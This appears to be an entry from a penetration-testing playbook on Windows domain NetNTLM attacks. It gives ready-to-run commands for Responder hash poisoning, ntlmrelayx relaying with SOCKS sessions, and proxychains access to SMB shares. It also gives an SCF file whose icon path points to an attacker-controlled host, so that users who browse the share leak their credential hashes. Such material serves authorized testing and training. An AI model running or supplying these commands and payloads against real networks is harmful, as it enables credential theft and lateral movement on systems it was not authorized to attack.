name: windows_responder_relay

info:
  title: Windows Domain NetNTLM (Reponder & Relay)
  author: evait security GmbH
  book: internal-pentest
  category: 04_windows_domain
  placeholder:
  references:
    - https://github.com/lgandx/Responder
    - https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#open-shares

content: |
  <h3>Responder</h3>
  <p>Analyzing mode<p>
  <code>sudo responder -I eth0 -A</code>
  <p>Redirect / Answering mode (capture hashes only)<p>
  <code>sudo responder -I eth0 -wrf</code>
  <h3>Relay</h3>
  <p>Generating a relay target list (optional)</p>
  <code>cme smb <span class="highlight">RHOSTS</span> --gen-relay-list /tmp/relay_targets.txt</code>
  <p>Relay incoming authentication attempts to targets and save hashes to /tmp/ntlm_relay_out</p>
  <code>ntlmrelayx.py -tf /tmp/relay_targets.txt --output-file /tmp/ntlm_relay_out -socks -smb2support</code>
  <code>sudo responder -I eth0 -wrf</code>
  <p>ntlmrelayx provides an ineractive shell that supports the <b>socks</b> command to display a list of sessions that can be used in a proxy. To be able to use the sessions proxychains can be used. For this the line "<b>socks5 127.0.0.1 1080</b>" must be inserted in the file <b>/etc/proxychains.conf</b>. Now you can access smb shares with proxychains and smbclient (leave password blank and confirm with enter): 
  <code>proxychains smbclient.py '@@SMBDomain/@@SMBUser@<span class="highlight">RHOST</span>'</code>
  <h3>SCF</h3>
  In some cases, you don't get connections to the responder but you have write permissions on network shares. then you can put a SCF file in the shares, which contains an icon that points to your own pc. for this you have to create the file "<b>@something.scf</b>" with the following content on the share: 
  <code>
[Shell]
Command=2
IconFile=\\<span class="highlight">LHOST</span>\Share\test.ico
[Taskbar]
Command=ToggleDesktop
  </code>
